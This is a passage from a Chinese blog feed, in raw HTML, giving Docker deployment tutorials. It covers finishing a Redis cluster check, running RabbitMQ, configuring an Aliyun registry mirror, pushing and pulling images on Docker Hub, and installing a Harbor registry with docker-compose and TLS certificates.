3a8dd5343c0b8f5580bc44f6b3bb5b4371d4dde5 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8006   slots: <span class="token punctuation">(</span>0 slots<span class="token punctuation">)</span> slave   replicates 40e69202bb3eab13a8157c33da6240bb31f2fd6f<span class="token namespace">[OK]</span> All nodes agree about slots configuration<span class="token punctuation">.</span>&gt;&gt;&gt; Check <span class="token keyword">for</span> open slots<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>&gt;&gt;&gt; Check slots coverage<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token namespace">[OK]</span> All 16384 slots covered<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="八、使用Docker容器实现RabbitMQ部署"><a href="#八、使用Docker容器实现RabbitMQ部署" class="headerlink" title="八、使用Docker容器实现RabbitMQ部署"></a>八、使用Docker容器实现RabbitMQ部署</h1><h2 id="8-1-获取参考资料"><a href="#8-1-获取参考资料" class="headerlink" title="8.1 获取参考资料"></a>8.1 获取参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213123228483.png" alt="image-20220213123228483"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213123307806.png" alt="image-20220213123307806"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213123355531.png" alt="image-20220213123355531"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213123503083.png" alt="image-20220213123503083"></p><h2 id="8-2-部署RabbitMQ"><a href="#8-2-部署RabbitMQ" class="headerlink" title="8.2 部署RabbitMQ"></a>8.2 部署RabbitMQ</h2><blockquote><p>部署带管理控制台的RabbitMQ</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d --name rabbitmq -p 5671:5671 -p 5672:5672 -p 4369:4369 -p 25672:25672 -p 15671:15671 -p 15672:15672 -v /opt/rabbitmq:/var/lib/rabbitmq rabbitmq:management</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS         PORTS                                                                                                                                                                                                                                             NAMES97d28093faa4   rabbitmq:management   <span class="token string">"docker-entrypoint.s…"</span>   11 seconds ago   Up 6 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:4369-&gt;4369/tcp<span class="token punctuation">,</span> :::4369-&gt;4369/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:5671-5672-&gt;5671-5672/tcp<span class="token punctuation">,</span> :::5671-5672-&gt;5671-5672/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:15671-15672-&gt;15671-15672/tcp<span class="token punctuation">,</span> :::15671-15672-&gt;15671-15672/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:25672-&gt;25672/tcp<span class="token punctuation">,</span> :::25672-&gt;25672/tcp<span class="token punctuation">,</span> 15691-15692/tcp   rabbitmq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">端口说明：4369<span class="token punctuation">,</span> 25672 <span class="token punctuation">(</span>Erlang发现&amp;集群端口<span class="token punctuation">)</span>5672<span class="token punctuation">,</span> 5671 <span class="token punctuation">(</span>AMQP端口<span class="token punctuation">)</span>15672 <span class="token punctuation">(</span>web管理后台端口<span class="token punctuation">)</span>61613<span class="token punctuation">,</span> 61614 <span class="token punctuation">(</span>STOMP协议端口<span class="token punctuation">)</span>1883<span class="token punctuation">,</span> 8883 <span class="token punctuation">(</span>MQTT协议端口<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213124157710.png" alt="image-20220213124157710"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213124232819.png" alt="image-20220213124232819"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220213124302137.png" alt="image-20220213124302137"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/03-rong-qi-jing-xiang-jia-su-qi-ji-ben-di-rong-qi-jing-xiang-cang-ku-harbor-bu-shu/docker-rong-qi-jing-xiang-jia-su-qi-ji-ben-di-rong-qi-jing-xiang-cang-ku/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/03-rong-qi-jing-xiang-jia-su-qi-ji-ben-di-rong-qi-jing-xiang-cang-ku-harbor-bu-shu/docker-rong-qi-jing-xiang-jia-su-qi-ji-ben-di-rong-qi-jing-xiang-cang-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="docker容器镜像加速器及本地容器镜像仓库"><a href="#docker容器镜像加速器及本地容器镜像仓库" class="headerlink" title="docker容器镜像加速器及本地容器镜像仓库"></a>docker容器镜像加速器及本地容器镜像仓库</h1><h1 id="一、容器镜像加速器"><a href="#一、容器镜像加速器" class="headerlink" title="一、容器镜像加速器"></a>一、容器镜像加速器</h1><blockquote><p>由于国内访问国外的容器镜像仓库速度比较慢，因此国内企业创建了容器镜像加速器，以方便国内用户使用容器镜像。</p></blockquote><h2 id="1-1-获取阿里云容器镜像加速地址"><a href="#1-1-获取阿里云容器镜像加速地址" class="headerlink" title="1.1 获取阿里云容器镜像加速地址"></a>1.1 获取阿里云容器镜像加速地址</h2><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125221631548.png" alt="image-20220125221631548"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125221748100.png" alt="image-20220125221748100"></p><h2 id="1-2-配置docker-daemon使用加速器"><a href="#1-2-配置docker-daemon使用加速器" class="headerlink" title="1.2 配置docker daemon使用加速器"></a>1.2 配置docker daemon使用加速器</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">添加daemon<span class="token punctuation">.</span>json配置文件<span class="token comment"># vim /etc/docker/daemon.json</span><span class="token comment"># cat /etc/docker/daemon.json</span><span class="token punctuation">{</span>        <span class="token string">"registry-mirrors"</span>: <span class="token punctuation">[</span><span class="token string">"https://s27w6kze.mirror.aliyuncs.com"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">重启docker<span class="token comment"># systemctl daemon-reload</span><span class="token comment"># systemctl restart docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">尝试下载容器镜像<span class="token comment"># docker pull centos</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="二、容器镜像仓库"><a href="#二、容器镜像仓库" class="headerlink" title="二、容器镜像仓库"></a>二、容器镜像仓库</h1><h2 id="2-1-docker-hub"><a href="#2-1-docker-hub" class="headerlink" title="2.1 docker hub"></a>2.1 docker hub</h2><h3 id="2-1-1-注册"><a href="#2-1-1-注册" class="headerlink" title="2.1.1 注册"></a>2.1.1 注册</h3><blockquote><p>准备邮箱及用户ID</p></blockquote><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125224745376.png" alt="image-20220125224745376"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125224838850.png" alt="image-20220125224838850"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125225243088.png" alt="image-20220125225243088"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125225448956.png" alt="image-20220125225448956"></p><h3 id="2-1-2-登录"><a href="#2-1-2-登录" class="headerlink" title="2.1.2 登录"></a>2.1.2 登录</h3><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125225753719.png" alt="image-20220125225753719"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125225914283.png" alt="image-20220125225914283"></p><h3 id="2-1-3-创建容器镜像仓库"><a href="#2-1-3-创建容器镜像仓库" class="headerlink" title="2.1.3 创建容器镜像仓库"></a>2.1.3 创建容器镜像仓库</h3><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125230046456.png" alt="image-20220125230046456"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125230216488.png" alt="image-20220125230216488"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125230307699.png" alt="image-20220125230307699"></p><h3 id="2-1-4-在本地登录Docker-Hub"><a href="#2-1-4-在本地登录Docker-Hub" class="headerlink" title="2.1.4 在本地登录Docker Hub"></a>2.1.4 在本地登录Docker Hub</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">默认可以不添加docker hub容器镜像仓库地址<span class="token comment"># docker login </span>Login with your Docker ID to push and pull images <span class="token keyword">from</span> Docker Hub<span class="token punctuation">.</span> <span class="token keyword">If</span> you don't have a Docker ID<span class="token punctuation">,</span> head over to https:<span class="token operator">/</span><span class="token operator">/</span>hub<span class="token punctuation">.</span>docker<span class="token punctuation">.</span>com to create one<span class="token punctuation">.</span>Username: dockersmartmsbPassword:WARNING! Your password will be stored unencrypted in <span class="token operator">/</span>root/<span class="token punctuation">.</span>docker/config<span class="token punctuation">.</span>json<span class="token punctuation">.</span>Configure a credential helper to remove this warning<span class="token punctuation">.</span> Seehttps:<span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>docker<span class="token punctuation">.</span>com/engine/reference/commandline/login/<span class="token comment">#credentials-store</span>Login Succeeded 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">登出<span class="token comment"># docker logout</span>Removing login credentials <span class="token keyword">for</span> https:<span class="token operator">/</span><span class="token operator">/</span>index<span class="token punctuation">.</span>docker<span class="token punctuation">.</span>io/v1/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-1-5-上传容器镜像"><a href="#2-1-5-上传容器镜像" class="headerlink" title="2.1.5 上传容器镜像"></a>2.1.5 上传容器镜像</h3><blockquote><p>在登录Docker Hub主机上传容器镜像,向全球用户共享容器镜像。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">为容器镜像重新打标记原始容器镜像<span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEcentos       latest    5d0da3dc9764   4 months ago   231MB重新为容器镜像打标记<span class="token comment"># docker tag centos:latest dockersmartmsb/centos:v1</span>重新打标记后容器镜像<span class="token comment"># docker images</span>REPOSITORY              TAG       IMAGE ID       CREATED        SIZEdockersmartmsb/centos   v1        5d0da3dc9764   4 months ago   231MBcentos                  latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传容器镜像至docker hub<span class="token comment"># docker push dockersmartmsb/centos:v1</span>The push refers to repository <span class="token namespace">[docker.io/dockersmartmsb/centos]</span>74ddd0ec08fa: Mounted <span class="token keyword">from</span> library/centosv1: digest: sha256:a1801b843b1bfaf77c501e7a6d3f709401a1e0c83863037fa3aab063a7fdb9dc size: 529<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125231912826.png" alt="image-20220125231912826"></p><h3 id="2-1-6-下载容器镜像"><a href="#2-1-6-下载容器镜像" class="headerlink" title="2.1.6 下载容器镜像"></a>2.1.6 下载容器镜像</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在其它主机上下载下载<span class="token comment"># docker pull dockersmartmsb/centos:v1</span>v1: Pulling <span class="token keyword">from</span> dockersmartmsb/centosa1d0c7532777: Pull completeDigest: sha256:a1801b843b1bfaf77c501e7a6d3f709401a1e0c83863037fa3aab063a7fdb9dcStatus: Downloaded newer image <span class="token keyword">for</span> dockersmartmsb/centos:v1docker<span class="token punctuation">.</span>io/dockersmartmsb/centos:v1查看下载后容器镜像<span class="token comment"># docker images</span>REPOSITORY              TAG       IMAGE ID       CREATED        SIZEdockersmartmsb/centos   v1        5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-harbor"><a href="#2-2-harbor" class="headerlink" title="2.2 harbor"></a>2.2 harbor</h2><h3 id="2-2-1-获取-docker-compose二进制文件"><a href="#2-2-1-获取-docker-compose二进制文件" class="headerlink" title="2.2.1 获取 docker compose二进制文件"></a>2.2.1 获取 docker compose二进制文件</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">下载docker-compose二进制文件<span class="token comment"># wget https://github.com/docker/compose/releases/download/1.25.0/docker-compose-Linux-x86_64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已下载二进制文件<span class="token comment"># ls</span>docker-compose-Linux-x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">移动二进制文件到<span class="token operator">/</span>usr/bin目录，并更名为docker-compose<span class="token comment"># mv docker-compose-Linux-x86_64 /usr/bin/docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">为二进制文件添加可执行权限<span class="token comment"># chmod +x /usr/bin/docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">安装完成后，查看docker-compse版本<span class="token comment"># docker-compose version</span>docker-compose version 1<span class="token punctuation">.</span>25<span class="token punctuation">.</span>0<span class="token punctuation">,</span> build 0a186604docker-py version: 4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>0CPython version: 3<span class="token punctuation">.</span>7<span class="token punctuation">.</span>4OpenSSL version: OpenSSL 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>0l  10 Sep 2019<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-2-获取harbor安装文件"><a href="#2-2-2-获取harbor安装文件" class="headerlink" title="2.2.2 获取harbor安装文件"></a>2.2.2 获取harbor安装文件</h3><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125232445910.png" alt="image-20220125232445910"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125232519365.png" alt="image-20220125232519365"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125233602760.png" alt="image-20220125233602760"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125233652604.png" alt="image-20220125233652604"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220125233739356.png" alt="image-20220125233739356"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">下载harbor离线安装包<span class="token comment"># wget https://github.com/goharbor/harbor/releases/download/v2.4.1/harbor-offline-installer-v2.4.1.tgz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已下载的离线安装包<span class="token comment"># ls</span>harbor-offline-installer-v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-2-3-获取TLS文件"><a href="#2-2-3-获取TLS文件" class="headerlink" title="2.2.3 获取TLS文件"></a>2.2.3 获取TLS文件</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看准备好的证书<span class="token comment"># ls</span>kubemsb<span class="token punctuation">.</span>com_nginx<span class="token punctuation">.</span>zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">解压证书压缩包文件<span class="token comment"># unzip kubemsb.com_nginx.zip</span>Archive:  kubemsb<span class="token punctuation">.</span>com_nginx<span class="token punctuation">.</span>zipAliyun Certificate Download  inflating: 6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>pem  inflating: 6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看解压出的文件<span class="token comment"># ls</span>6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-4-修改配置文件"><a href="#2-2-4-修改配置文件" class="headerlink" title="2.2.4 修改配置文件"></a>2.2.4 修改配置文件</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">解压harbor离线安装包<span class="token comment"># tar xf harbor-offline-installer-v2.4.1.tgz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看解压出来的目录<span class="token comment"># ls</span>harbor <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">移动证书到harbor目录<span class="token comment"># # mv 6864844_kubemsb.com.* harbor</span>查看harbor目录<span class="token comment"># ls harbor</span>6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key  6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>pem  common<span class="token punctuation">.</span>sh  harbor<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz  harbor<span class="token punctuation">.</span>yml<span class="token punctuation">.</span>tmpl  install<span class="token punctuation">.</span>sh  LICENSE  prepare<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建配置文件<span class="token comment"># cd harbor/</span><span class="token comment"># mv harbor.yml.tmpl harbor.yml</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">修改配置文件内容<span class="token comment"># vim harbor.yml</span><span class="token comment"># Configuration file of Harbor</span><span class="token comment"># The IP address or hostname to access admin UI and registry service.</span><span class="token comment"># DO NOT use localhost or 127.0.0.1, because Harbor needs to be accessed by external clients.</span>hostname: www<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com 修改为域名，而且一定是证书签发的域名<span class="token comment"># http related config</span>http:  <span class="token comment"># port for http, default is 80. If https enabled, this port will redirect to https port</span>  port: 80<span class="token comment"># https related config</span>https:  <span class="token comment"># https port for harbor, default is 443</span>  port: 443  <span class="token comment"># The path of cert and key files for nginx</span>  certificate: <span class="token operator">/</span>root/harbor/6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>pem 证书  private_key: <span class="token operator">/</span>root/harbor/6864844_kubemsb<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key 密钥<span class="token comment"># # Uncomment following will enable tls communication between all harbor components</span><span class="token comment"># internal_tls:</span><span class="token comment">#   # set enabled to true means internal tls is enabled</span><span class="token comment">#   enabled: true</span><span class="token comment">#   # put your cert and key files on dir</span><span class="token comment">#   dir: /etc/harbor/tls/internal</span><span class="token comment"># Uncomment external_url if you want to enable external proxy</span><span class="token comment"># And when it enabled the hostname will no longer used</span><span class="token comment"># external_url: https://reg.mydomain.com:8433</span><span class="token comment"># The initial password of Harbor admin</span><span class="token comment"># It only works in first time to install harbor</span><span class="token comment"># Remember Change the admin password from UI after launching Harbor.</span>harbor_admin_password: 12345 访问密码<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-5-执行预备脚本"><a href="#2-2-5-执行预备脚本" class="headerlink" title="2.2.5 执行预备脚本"></a>2.2.5 执行预备脚本</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ./prepare</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出prepare base <span class="token function">dir</span> is <span class="token function">set</span> to <span class="token operator">/</span>root/harborClearing the configuration file: <span class="token operator">/</span>config/portal/nginx<span class="token punctuation">.</span>confClearing the configuration file: <span class="token operator">/</span>config/log/logrotate<span class="token punctuation">.</span>confClearing the configuration file: <span class="token operator">/</span>config/log/rsyslog_docker<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/portal/nginx<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/log/logrotate<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/log/rsyslog_docker<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/nginx/nginx<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/core/envGenerated configuration file: <span class="token operator">/</span>config/core/app<span class="token punctuation">.</span>confGenerated configuration file: <span class="token operator">/</span>config/registry/config<span class="token punctuation">.</span>ymlGenerated configuration file: <span class="token operator">/</span>config/registryctl/envGenerated configuration file: <span class="token operator">/</span>config/registryctl/config<span class="token punctuation">.</span>ymlGenerated configuration file: <span class="token operator">/</span>config/db/envGenerated configuration file: <span class="token operator">/</span>config/jobservice/envGenerated configuration file: <span class="token operator">/</span>config/jobservice/config<span class="token punctuation">.</span>ymlGenerated and saved secret to file: <span class="token operator">/</span><span class="token keyword">data</span><span class="token operator">/</span>secret/keys/secretkeySuccessfully called func: create_root_certGenerated configuration file: <span class="token operator">/</span>compose_location/docker-compose<span class="token punctuation">.</span>ymlClean up the input <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-6-执行安装脚本"><a href="#2-2-6-执行安装脚本" class="headerlink" title="2.2.6 执行安装脚本"></a>2.2.6 执行安装脚本</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ./install.sh</span><span aria-hidden="true" 